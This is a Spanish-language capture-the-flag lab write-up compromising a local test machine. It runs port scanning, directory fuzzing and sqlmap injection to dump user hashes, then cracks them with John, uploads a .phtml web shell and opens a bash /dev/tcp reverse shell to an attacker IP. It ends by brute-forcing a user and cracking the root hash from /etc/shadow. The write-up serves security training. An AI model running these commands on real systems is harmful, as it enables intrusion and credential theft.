tags: #fuzzing #sqli #file-upload 
____
## Reconocimiento

```bash
ping -c 1 172.17.0.2
```

![[Pasted image 20251102002351.png]]

Estamos ante un sistema linux, así que seguimos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:

```bash
nmap -sS -p- -vvv -n -Pn --open -oN ports 172.17.0.2 --min-rate 5000
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251102002609.png]]

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV -p80 -n -Pn -vvv --min-rate 5000 -oN version 172.17.0.2
```

![[Anexos/Pasted image 20251102002625.png]]

Solo hay un servicio web, así que vamos a ver de qué se trata:

![[Anexos/Pasted image 20251102002702.png]]

En este punto vamos a aplicar fuzzing para descubrir directorios y archivos ocultos en la web:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml -o dirs.txt
```

![[Anexos/Pasted image 20251102002845.png]]

Vemos que casi todos los recursos apuntan al login, así que vamos a enfocarnos en los que no, que son vendor, uploads e img. En el directorio uploads no hay nada. En el directorio imágenes hay unas fotos:

![[Anexos/Pasted image 20251102003501.png]]

En el directorio vendor hay lo siguiente, y vamos a fijarnos en el recurso autoupload, ya que sugiere que alomejor podemos subir algo.

![[Anexos/Pasted image 20251102003350.png]]

Vamos a acceder al directorio register.php para intentar crearnos una cuenta:

![[Anexos/Pasted image 20251102004024.png|800]]

Tras iniciar sesión, podemos ver la página de compras:

![[Anexos/Pasted image 20251102004325.png]]

Vamos a simular una compra y probar algunas cosas.

Al ver un campo de búsqueda y probar poner una comilla **'** veo que me arroja lo siguiente:

![[Anexos/Pasted image 20251102005111.png]]

Como no consigo dar con nada, voy a probar interceptar la petición con burpsuite y luego tratarla con sqlmap. Vamos por pasos.

![[Anexos/Pasted image 20251102013703.png]]

Después de interceptar esa petición, la guardo en un fichero llamado **search.txt**, y lo procesamos con sqlmap de la siguiente manera:

```bash
sqlmap -r search.txt --dbs --batch 
```

![[Anexos/Pasted image 20251102013745.png]]

```bash
sqlmap -u "http://172.17.0.2/mycart.php?search=" --level=5 --dbs --batch --cookie="PHPSESSID=ppe2g1p4n58b991sthrqrtgt3o" 
```

Obtenemos lo siguiente, y usaremos esta opción para continuar:

![[Anexos/Pasted image 20251102013427.png]]

Ahora, seleccionamos la base de datos apple_store con el parámetro -D y --tables

```bash
sqlmap -u "http://172.17.0.2/mycart.php?search=1" --batch --cookie="PHPSESSID=ppe2g1p4n58b991sthrqrtgt3o" -D apple_store --tables
```

![[Anexos/Pasted image 20251102014941.png]]

Ahora, añadimos el parámetro -T para referenciar la tabla USERS y luego el parámetro --dump para extraer el contenido:

```bash
sqlmap -u "http://172.17.0.2/mycart.php?search=1" --batch --cookie="PHPSESSID=ppe2g1p4n58b991sthrqrtgt3o" -D apple_store -T users --dump
```

![[Anexos/Pasted image 20251102020255.png]]

Bueno ya vemos las contraseñas, entre ellas la del usuario admin, que parece estar en formato SHA1, así que vamos a probar crackearla con Jhon the reaper.
Primero creamos un archivo hash.txt con el contenido de la contraseña del admin:

![[Anexos/Pasted image 20251102021138.png|800]]

```bash
echo -n "7f73ae7a9823a66efcddd10445804f7d124cd8b0" > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Anexos/Pasted image 20251102021235.png]]

Ahora accedemos al panel de admin de la web, y vemos un apartado de subida de archivos:

![[Anexos/Pasted image 20251102021355.png]]

Al intentar subir un archivo php con un código malicioso para ejecutar comandos remotamente vemos que nos arroja el siguiente error:

![[Anexos/Pasted image 20251102021458.png]]

Lo que vamos a hacer es interceptar la petición con burpsuite y probar subir el archivo cambiando algunas configuraciones:

![[Anexos/Pasted image 20251102023310.png]]

Conseguimos subirlo usando la extensión **.phtml** y ahora solo debemos ir a la ruta **/uploads** y ejecutar un comando con el parámetro **id**:

![[Anexos/Pasted image 20251102023229.png]]

Ahora, teniendo una RCE, vamos a entablar una reverse shell a nuestra máquina de atacante para tener mas comodidad:

```bash
http://172.17.0.2/uploads/shell.phtml?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.70.86/443 0>%261"
```

![[Anexos/Pasted image 20251102023824.png]]

Después de probar varias cosas, sin éxito, ejecuto un script de bash para hacer fuerza bruta sobre el usuario luisillo_o, que lo localizamos también en la base de datos de la web. Conseguimos su contraseña:

![[Anexos/Pasted image 20251102041246.png]]

Ahora veo que tengo permiso de lectura para el archivo /etc/shadow, y puedo copiar la contraseña para tratar de crackearla en local:

![[Anexos/Pasted image 20251102041638.png]]

![[Anexos/Pasted image 20251102042200.png]]

Ahora con Jhon lo crackeamos:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt root.txt --format=crypt
```

![[Anexos/Pasted image 20251102042322.png]]

Nos conectamos y ya somos root:

![[Anexos/Pasted image 20251102042406.png]]











